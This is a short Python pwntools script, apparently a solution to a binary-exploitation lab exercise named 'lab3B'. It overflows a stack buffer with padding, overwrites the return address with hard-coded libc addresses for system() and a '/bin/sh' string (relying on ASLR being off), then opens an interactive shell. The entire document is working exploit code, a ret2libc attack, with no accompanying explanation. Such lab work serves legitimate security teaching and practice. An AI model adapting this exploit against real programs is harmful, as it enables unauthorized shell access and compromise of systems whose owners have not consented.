from pwn import *
chall = ELF("./lab3B")
#s = process(["./lab3B"])
buffer_addr = 0xffffcf10
system = p32(0xf7e06780)
binsh = p32(0xf7f53363)
#ASLR is off, so these are fixed address
payload = b"a"*0x98 + b"aaaa" + system + b"aaaa" + binsh
s = process(["./lab3B"])
s.sendline(payload)
s.interactive()
